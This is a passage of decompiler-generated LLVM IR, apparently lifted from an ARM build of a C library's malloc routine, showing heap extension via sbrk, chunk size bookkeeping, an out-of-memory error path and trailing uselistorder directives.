  store i32 %v3_13850, i32* %r2.global-to-local, align 4
  %v1_13928 = add i32 %v4_13920, 872
  %v2_13928 = inttoptr i32 %v1_13928 to i32*
  %v3_13928 = load i32, i32* %v2_13928, align 4
  %v1_1392c = load i32, i32* @r8, align 4
  %v2_1392c = add i32 %v1_1392c, %v3_13850
  store i32 %v2_1392c, i32* %r1.global-to-local, align 4
  %v0_13930 = load i32, i32* @r5, align 4
  %v2_13930 = add i32 %v0_13930, %v3_13928
  store i32 %v2_13930, i32* %r3.global-to-local, align 4
  %v9_13934 = icmp eq i32 %v0_13910, %v2_1392c
  br i1 %v9_13934, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_13918
  store i32 %v2_13930, i32* %v2_13928, align 4
  br label %dec_label_pc_13950

bb162:                                            ; preds = %dec_label_pc_13918
  %v1_13938 = load i32, i32* %r0.global-to-local, align 4
  %v8_13938 = icmp eq i32 %v1_13938, -1
  store i32 %v2_13930, i32* %v2_13928, align 4
  br i1 %v8_13938, label %.thread37, label %dec_label_pc_13950

.thread37:                                        ; preds = %bb162
  %v1_13940 = load i32, i32* @r5, align 4
  %v2_13940 = load i32, i32* @r8, align 4
  %v3_13940 = add i32 %v2_13940, %v1_13940
  %v2_13944 = or i32 %v3_13940, 1
  store i32 %v2_13944, i32* %r3.global-to-local, align 4
  %v2_13948 = load i32, i32* %r2.global-to-local, align 4
  %v3_13948 = add i32 %v2_13948, 4
  %v4_13948 = inttoptr i32 %v3_13948 to i32*
  store i32 %v2_13944, i32* %v4_13948, align 4
  br label %dec_label_pc_13ac8

dec_label_pc_13950:                               ; preds = %bb162, %.thread125
  %v0_13954.pr = load i32, i32* @r8, align 4
  %v0_13950 = load i32, i32* %ip.global-to-local, align 4
  %v1_13950 = add i32 %v0_13950, 864
  %v2_13950 = inttoptr i32 %v1_13950 to i32*
  %v3_13950 = load i32, i32* %v2_13950, align 4
  store i32 %v3_13950, i32* %r2.global-to-local, align 4
  %v2_13954 = icmp eq i32 %v0_13954.pr, 0
  br i1 %v2_13954, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_13950
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_13950
  %v2_1395c = urem i32 %v3_13950, 2
  store i32 %v2_1395c, i32* %r3.global-to-local, align 4
  %v2_13960 = icmp eq i32 %v2_1395c, 0
  br i1 %v2_13960, label %.thread43, label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %.thread39
  %v0_13968 = load i32, i32* @r4, align 4
  %v1_13968 = load i32, i32* %r1.global-to-local, align 4
  %v3_13968 = icmp ult i32 %v0_13968, %v1_13968
  br i1 %v3_13968, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_13968
  %v2_1396c = and i32 %v3_13950, -2
  store i32 %v2_1396c, i32* %r3.global-to-local, align 4
  store i32 %v2_1396c, i32* %v2_13950, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_13968, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v4_1397c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_1397c, i32* @r7, align 4
  %v1_13980 = add i32 %v4_1397c, 864
  %v2_13980 = inttoptr i32 %v1_13980 to i32*
  %v3_13980 = load i32, i32* %v2_13980, align 4
  store i32 %v3_13980, i32* %r3.global-to-local, align 4
  %v1_13984 = urem i32 %v3_13980, 2
  store i32 %v1_13984, i32* @r6, align 4
  %v2_13984 = icmp eq i32 %v1_13984, 0
  br i1 %v2_13984, label %dec_label_pc_13a18, label %dec_label_pc_1398c

dec_label_pc_1398c:                               ; preds = %.thread43
  %v0_1398c = load i32, i32* @r8, align 4
  %v2_1398c = icmp eq i32 %v0_1398c, 0
  br i1 %v2_1398c, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_1398c
  %v2_13990 = add i32 %v4_1397c, 872
  %v3_13990 = inttoptr i32 %v2_13990 to i32*
  %v4_13990 = load i32, i32* %v3_13990, align 4
  store i32 %v4_13990, i32* %r2.global-to-local, align 4
  %v1_13994 = load i32, i32* %r1.global-to-local, align 4
  %v2_13994 = load i32, i32* @r4, align 4
  %v3_13994 = sub i32 %v2_13994, %v1_13994
  %v3_13998 = add i32 %v3_13994, %v4_13990
  store i32 %v3_13998, i32* %r3.global-to-local, align 4
  store i32 %v3_13998, i32* %v3_13990, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1398c, %bb164
  %v0_139a0 = load i32, i32* @r4, align 4
  %v1_139a0 = urem i32 %v0_139a0, 8
  store i32 %v1_139a0, i32* %r3.global-to-local, align 4
  %v2_139a0 = icmp eq i32 %v1_139a0, 0
  br i1 %v2_139a0, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_139a4 = sub nsw i32 8, %v1_139a0
  store i32 %v2_139a4, i32* %r3.global-to-local, align 4
  %v3_139a8 = add i32 %v2_139a4, %v0_139a0
  store i32 %v3_139a8, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_139b0 = phi i32 [ 0, %.thread46 ], [ %v2_139a4, %bb165 ]
  %v1_139ac = load i32, i32* @r5, align 4
  %v2_139ac = add i32 %v1_139ac, %v0_139a0
  store i32 %v2_139ac, i32* @r6, align 4
  %v1_139b0 = load i32, i32* @r8, align 4
  %v2_139b0 = add i32 %v2_139ac, %v0_139b0
  %v2_139b4 = add i32 %v2_139b0, %v1_139b0
  store i32 %v2_139b4, i32* %r1.global-to-local, align 4
  %v1_139b8 = load i32, i32* %sb.global-to-local, align 4
  %v2_139b8 = add i32 %v1_139b8, %v2_139b4
  %v1_139bc = load i32, i32* %fp.global-to-local, align 4
  %v2_139bc = and i32 %v1_139bc, %v2_139b8
  store i32 %v2_139bc, i32* %r2.global-to-local, align 4
  %v2_139c0 = sub i32 0, %v2_139ac
  store i32 %v2_139c0, i32* %r3.global-to-local, align 4
  %v2_139c4 = sub i32 %v2_139bc, %v2_139ac
  store i32 %v2_139c4, i32* @r5, align 4
  store i32 %v2_139c4, i32* %r0.global-to-local, align 4
  br i1 %v2_139a0, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_139a0, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_139d0 = call i32 @__GI_sbrk(i32 %v2_139c4)
  store i32 %v1_139d0, i32* %r0.global-to-local, align 4
  %v3_139d4 = icmp eq i32 %v1_139d0, -1
  br i1 %v3_139d4, label %dec_label_pc_139dc, label %dec_label_pc_139ec

dec_label_pc_139dc:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_139e0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_139e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13a44

dec_label_pc_139ec:                               ; preds = %bb167
  %v1_139ec = load i32, i32* @r4, align 4
  %v3_139ec = icmp ult i32 %v1_139d0, %v1_139ec
  br i1 %v3_139ec, label %dec_label_pc_139f4, label %dec_label_pc_13a44

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139ec
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r0.global-to-local, align 4
  %v4_139fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_139fc, i32* %r2.global-to-local, align 4
  %v1_13a00 = add i32 %v4_139fc, 864
  %v2_13a00 = inttoptr i32 %v1_13a00 to i32*
  %v3_13a00 = load i32, i32* %v2_13a00, align 4
  %v0_13a04 = load i32, i32* @r6, align 4
  store i32 %v0_13a04, i32* %r0.global-to-local, align 4
  %v1_13a08 = and i32 %v3_13a00, -2
  store i32 %v1_13a08, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_13a08, i32* %v2_13a00, align 4
  br label %dec_label_pc_13a44

dec_label_pc_13a18:                               ; preds = %.thread43
  %v0_13a18 = load i32, i32* %r0.global-to-local, align 4
  %v3_13a18 = icmp eq i32 %v0_13a18, -1
  br i1 %v3_13a18, label %dec_label_pc_13a20, label %dec_label_pc_13a3c

dec_label_pc_13a20:                               ; preds = %dec_label_pc_13a18
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13a24 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13a24, i32* %r0.global-to-local, align 4
  %v0_13a28 = load i32, i32* @r7, align 4
  %v1_13a28 = add i32 %v0_13a28, 872
  %v2_13a28 = inttoptr i32 %v1_13a28 to i32*
  %v3_13a28 = load i32, i32* %v2_13a28, align 4
  store i32 %v3_13a28, i32* %r2.global-to-local, align 4
  %v0_13a2c = load i32, i32* @r4, align 4
  %v0_13a30 = load i32, i32* @r5, align 4
  %v2_13a2c = add i32 %v3_13a28, %v1_13a24
  %v2_13a30 = sub i32 %v2_13a2c, %v0_13a2c
  %v2_13a34 = sub i32 %v2_13a30, %v0_13a30
  store i32 %v2_13a34, i32* %r3.global-to-local, align 4
  store i32 %v2_13a34, i32* %v2_13a28, align 4
  %v0_13a40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a3c

dec_label_pc_13a3c:                               ; preds = %dec_label_pc_13a18, %dec_label_pc_13a20
  %v0_13a40 = phi i32 [ 0, %dec_label_pc_13a18 ], [ %v0_13a40.pre, %dec_label_pc_13a20 ]
  %v0_13a3c = load i32, i32* @r4, align 4
  store i32 %v0_13a3c, i32* @r7, align 4
  store i32 %v0_13a40, i32* @r5, align 4
  br label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %dec_label_pc_139ec, %dec_label_pc_139f4, %dec_label_pc_139dc, %dec_label_pc_13a3c
  %v0_13a44 = load i32, i32* %r0.global-to-local, align 4
  %v7_13a44 = icmp eq i32 %v0_13a44, -1
  br i1 %v7_13a44, label %dec_label_pc_13ac8, label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a44
  %v1_13a4c = load i32, i32* @r5, align 4
  %v2_13a4c = add i32 %v1_13a4c, %v0_13a44
  %v0_13a50 = load i32, i32* @r7, align 4
  %v2_13a50 = sub i32 %v2_13a4c, %v0_13a50
  %v1_13a54 = or i32 %v2_13a50, 1
  %v2_13a58 = add i32 %v0_13a50, 4
  %v3_13a58 = inttoptr i32 %v2_13a58 to i32*
  store i32 %v1_13a54, i32* %v3_13a58, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13a64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a64, i32* @r6, align 4
  %v1_13a68 = add i32 %v4_13a64, 872
  %v2_13a68 = inttoptr i32 %v1_13a68 to i32*
  %v3_13a68 = load i32, i32* %v2_13a68, align 4
  %v0_13a6c = load i32, i32* @r8, align 4
  %v2_13a6c = icmp eq i32 %v0_13a6c, 0
  %v0_13a70 = load i32, i32* @r5, align 4
  %v2_13a70 = add i32 %v0_13a70, %v3_13a68
  store i32 %v2_13a70, i32* %r3.global-to-local, align 4
  store i32 %v2_13a70, i32* %v2_13a68, align 4
  %v0_13a78 = load i32, i32* @r7, align 4
  %v1_13a78 = load i32, i32* @r6, align 4
  %v2_13a78 = add i32 %v1_13a78, 44
  %v3_13a78 = inttoptr i32 %v2_13a78 to i32*
  store i32 %v0_13a78, i32* %v3_13a78, align 4
  br i1 %v2_13a6c, label %dec_label_pc_13ac8, label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a4c
  %v0_13a84 = load i32, i32* @r8, align 4
  %v1_13a84 = add i32 %v0_13a84, -12
  %v1_13a88 = and i32 %v1_13a84, -8
  store i32 %v3_13850, i32* %ip.global-to-local, align 4
  %v2_13a90 = add i32 %v1_13a88, %v3_13850
  store i32 %v2_13a90, i32* %r1.global-to-local, align 4
  %v2_13a94 = icmp ugt i32 %v1_13a88, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_13a9c = or i32 %v1_13a88, 1
  store i32 %v1_13a9c, i32* %r3.global-to-local, align 4
  store i32 %v1_13a9c, i32* %v2_1385c, align 4
  %v0_13aa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13aa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13aa4 = add i32 %v1_13aa4, 8
  %v3_13aa4 = inttoptr i32 %v2_13aa4 to i32*
  store i32 %v0_13aa4, i32* %v3_13aa4, align 4
  %v0_13aa8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13aa8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13aa8 = add i32 %v1_13aa8, 4
  %v3_13aa8 = inttoptr i32 %v2_13aa8 to i32*
  store i32 %v0_13aa8, i32* %v3_13aa8, align 4
  br i1 %v2_13a94, label %dec_label_pc_13ab0, label %dec_label_pc_13ac8

dec_label_pc_13ab0:                               ; preds = %dec_label_pc_13a80
  %v0_13ab0 = load i32, i32* @r6, align 4
  %v1_13ab0 = add i32 %v0_13ab0, 836
  %v2_13ab0 = inttoptr i32 %v1_13ab0 to i32*
  %v3_13ab0 = load i32, i32* %v2_13ab0, align 4
  store i32 %v3_13ab0, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13ab8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ab8 = add i32 %v0_13ab8, 8
  store i32 %v1_13ab8, i32* @r0, align 4
  store i32 -1, i32* %v2_13ab0, align 4
  %v0_13ac0 = call i32 @free()
  store i32 %v0_13ac0, i32* %r0.global-to-local, align 4
  %v0_13ac4 = load i32, i32* @r4, align 4
  %v1_13ac4 = load i32, i32* @r6, align 4
  %v2_13ac4 = add i32 %v1_13ac4, 836
  %v3_13ac4 = inttoptr i32 %v2_13ac4 to i32*
  store i32 %v0_13ac4, i32* %v3_13ac4, align 4
  br label %dec_label_pc_13ac8

dec_label_pc_13ac8:                               ; preds = %.thread37, %dec_label_pc_13a80, %dec_label_pc_13a4c, %dec_label_pc_13a44, %dec_label_pc_13ab0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r0.global-to-local, align 4
  %v4_13ad0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13ad0, i32* %lr.global-to-local, align 4
  %v1_13ad4 = add i32 %v4_13ad0, 872
  store i32 %v1_13ad4, i32* %r1.global-to-local, align 4
  %v1_13ad8 = inttoptr i32 %v1_13ad4 to i32*
  %v2_13ad8 = load i32, i32* %v1_13ad8, align 4
  store i32 %v2_13ad8, i32* %r1.global-to-local, align 4
  %v3_13ad8 = add i32 %v4_13ad0, 876
  %v4_13ad8 = inttoptr i32 %v3_13ad8 to i32*
  %v5_13ad8 = load i32, i32* %v4_13ad8, align 4
  store i32 %v5_13ad8, i32* %r3.global-to-local, align 4
  %v1_13ae0 = add i32 %v4_13ad0, 868
  %v2_13ae0 = inttoptr i32 %v1_13ae0 to i32*
  %v3_13ae0 = load i32, i32* %v2_13ae0, align 4
  store i32 %v3_13ae0, i32* %r3.global-to-local, align 4
  %v1_13ae4 = add i32 %v4_13ad0, 884
  %v2_13ae4 = inttoptr i32 %v1_13ae4 to i32*
  %v3_13ae4 = load i32, i32* %v2_13ae4, align 4
  store i32 %v3_13ae4, i32* %r2.global-to-local, align 4
  %v2_13ae8 = add i32 %v3_13ae0, %v2_13ad8
  store i32 %v2_13ae8, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_13ad8, %v5_13ad8
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_13ac8
  store i32 %v2_13ad8, i32* %v4_13ad8, align 4
  %v0_13af0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13af0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_13ac8, %bb168
  %v1_13af0 = phi i32 [ %v3_13ae4, %dec_label_pc_13ac8 ], [ %v1_13af0.pre, %bb168 ]
  %v4_13af4 = phi i32 [ %v2_13ae8, %dec_label_pc_13ac8 ], [ %v0_13af0.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_13af4, %v1_13af0
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_13af4 = load i32, i32* %lr.global-to-local, align 4
  %v6_13af4 = add i32 %v5_13af4, 884
  %v7_13af4 = inttoptr i32 %v6_13af4 to i32*
  store i32 %v4_13af4, i32* %v7_13af4, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_13af8 = load i32, i32* %lr.global-to-local, align 4
  %v1_13af8 = add i32 %v0_13af8, 44
  %v2_13af8 = inttoptr i32 %v1_13af8 to i32*
  %v3_13af8 = load i32, i32* %v2_13af8, align 4
  store i32 %v3_13af8, i32* %ip.global-to-local, align 4
  %v1_13afc = add i32 %v3_13af8, 4
  %v2_13afc = inttoptr i32 %v1_13afc to i32*
  %v3_13afc = load i32, i32* %v2_13afc, align 4
  store i32 %v1_13710, i32* %r1.global-to-local, align 4
  %v1_13b04 = and i32 %v3_13afc, -4
  store i32 %v1_13b04, i32* %r3.global-to-local, align 4
  %v3_13b08 = icmp ult i32 %v1_13b04, %v1_13710
  br i1 %v3_13b08, label %dec_label_pc_13b34, label %dec_label_pc_13b10

dec_label_pc_13b10:                               ; preds = %bb171
  %v0_13b10 = load i32, i32* @sl, align 4
  %v2_13b10 = sub i32 %v1_13b04, %v0_13b10
  %v2_13b14 = add i32 %v0_13b10, %v3_13af8
  store i32 %v2_13b14, i32* %r1.global-to-local, align 4
  %v1_13b18 = or i32 %v2_13b10, 1
  store i32 %v1_13b18, i32* %r3.global-to-local, align 4
  %v1_13b1c = or i32 %v0_13b10, 1
  store i32 %v1_13b1c, i32* %r2.global-to-local, align 4
  %v1_13b20 = add i32 %v3_13af8, 8
  store i32 %v1_13b20, i32* %r0.global-to-local, align 4
  store i32 %v1_13b1c, i32* %v2_13afc, align 4
  %v0_13b28 = load i32, i32* %r1.global-to-local, align 4
  %v1_13b28 = load i32, i32* %lr.global-to-local, align 4
  %v2_13b28 = add i32 %v1_13b28, 44
  %v3_13b28 = inttoptr i32 %v2_13b28 to i32*
  store i32 %v0_13b28, i32* %v3_13b28, align 4
  %v0_13b2c = load i32, i32* %r3.global-to-local, align 4
  %v1_13b2c = load i32, i32* %r1.global-to-local, align 4
  %v2_13b2c = add i32 %v1_13b2c, 4
  %v3_13b2c = inttoptr i32 %v2_13b2c to i32*
  store i32 %v0_13b2c, i32* %v3_13b2c, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13b34:                               ; preds = %bb160, %bb171, %dec_label_pc_13910
  store i32 62756, i32* %r3.global-to-local, align 4
  %v0_13b38 = call i32 @__aeabi_read_tp()
  %v3_13b3c = load i16, i16* @global_var_23068.363, align 2
  %v4_13b3c = sext i16 %v3_13b3c to i32
  store i32 %v4_13b3c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13b44 = add i32 %v4_13b3c, %v0_13b38
  %v4_13b44 = inttoptr i32 %v3_13b44 to i32*
  store i32 12, i32* %v4_13b44, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13b4c:                               ; preds = %bb154, %bb153, %dec_label_pc_13b10, %dec_label_pc_13758, %dec_label_pc_13b34
  %v0_13b4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13b4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %.thread4, %dec_label_pc_13724, %.thread124, %dec_label_pc_13594, %dec_label_pc_13588, %dec_label_pc_133f0, %dec_label_pc_13374, %dec_label_pc_13b4c
  store i32 %v2_13294, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v4_13b60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 44) to i32*), align 4
  store i32 %v4_13b60, i32* @ip, align 4
  store i32 80748, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13b60)
  br label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_13b50
  %v0_13b6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b6c, i32* %r0.global-to-local, align 4
  store i32 %v3_13268, i32* @r4, align 4
  store i32 %v6_13268, i32* @r5, align 4
  store i32 %v9_13268, i32* @r6, align 4
  store i32 %v12_13268, i32* @r7, align 4
  store i32 %v15_13268, i32* @r8, align 4
  store i32 %v18_13268, i32* @sb, align 4
  store i32 %v21_13268, i32* @sl, align 4
  store i32 %v24_13268, i32* @fp, align 4
  store i32 %v27_13268, i32* @lr, align 4
  ret i32 %v0_13b6c

; uselistorder directives
  uselistorder i32 %v0_13b10, { 1, 0, 2 }
  uselistorder i32 %v3_13af8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13af4, { 1, 0 }
  uselistorder i32 %v2_13ad8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13ad0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13a88, { 1, 2, 0 }
  uselistorder i32 %v0_13a50, { 1, 0 }
  uselistorder i32 %v0_13a44, { 1, 0 }
  uselistorder i32 %v2_13a34, { 1, 0 }
  uselistorder i32 %v2_139c4, { 2, 1, 0 }
  uselistorder i32 %v2_139ac, { 1, 2, 0, 3 }
  uselistorder i32 %v2_139a4, { 1, 0, 2 }
  uselistorder i32 %v1_139a0, { 2, 1, 0 }
  uselistorder i32 %v0_139a0, { 3, 1, 2, 0 }
  uselistorder i32 %v1_13984, { 1, 0 }
  uselistorder i32 %v2_1395c, { 1, 0 }
  uselistorder i32 %v3_13950, { 1, 0, 2 }
  uselistorder i32 %v2_13930, { 1, 0, 2 }
  uselistorder i32* %v2_13928, { 1, 0, 2 }
  uselistorder i32 %v0_13910, { 1, 0 }
  uselistorder i32 %v6_138ec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_138d8, { 2, 1, 0 }
  uselistorder i32 %v0_138c0, { 1, 0 }
  uselistorder i32 %v2_1387c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13878, { 1, 0 }
  uselistorder i32 %v3_13850, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_13830, { 1, 0, 2 }
  uselistorder i32 %v2_13818, { 1, 2, 0, 3 }
  uselistorder i32 %v1_137c0, { 2, 1, 0 }
  uselistorder i32 %v6_137b4, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_13790, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13750, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13710, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_13708, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13704, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_136f0, { 1, 0 }
  uselistorder i32 %v7_136b0, { 1, 0 }
  uselistorder i32 %v4_136b0, { 1, 0 }
  uselistorder i32 %v0_13680, { 1, 0 }
  uselistorder i32 %v2_13654, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1365057, { 1, 0 }
  uselistorder i32 %v1_1361c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_13604., { 1, 2, 0 }
  uselistorder i32 %v0_1360c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1360c, { 1, 0 }
  uselistorder i32 %v3_135ec, { 1, 0 }
  uselistorder i32 %v4_135e8, { 1, 0, 2 }
  uselistorder i32 %v1_13558, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_135b0, { 1, 0 }
  uselistorder i32 %v1_13594, { 1, 0 }
  uselistorder i32 %v1_13434, { 1, 0 }
  uselistorder i32 %v0_13574, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1353c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_135d0.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13518, { 2, 1, 0 }
  uselistorder i32 %v3_1350c, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_1342c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_134d4, { 1, 0 }
  uselistorder i32 %v3_134c8, { 1, 0 }
  uselistorder i32 %v0_134d4, { 1, 0 }
  uselistorder i32 %v3_134ac, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1349c, { 1, 0, 2 }
  uselistorder i32 %v3_13454, { 2, 1, 0 }
  uselistorder i32 %v0_13444, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13414, { 1, 0 }
  uselistorder i32 %v1_133c8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_133c4, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_13368, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_1335c, { 1, 0 }
  uselistorder i32 %v3_1332c, { 1, 0 }
  uselistorder i32 %v0_13320, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13300, { 0, 2, 1, 3 }
  uselistorder i1 %v7_132f4, { 1, 0 }
  uselistorder i32 %v0_132c4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 33, 30, 31, 0, 32, 34, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_13b6c, { 1, 0 }
  uselistorder label %dec_label_pc_13b50, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13b4c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13b34, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_13ac8, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_13a44, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13a3c, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13910, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_13844, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
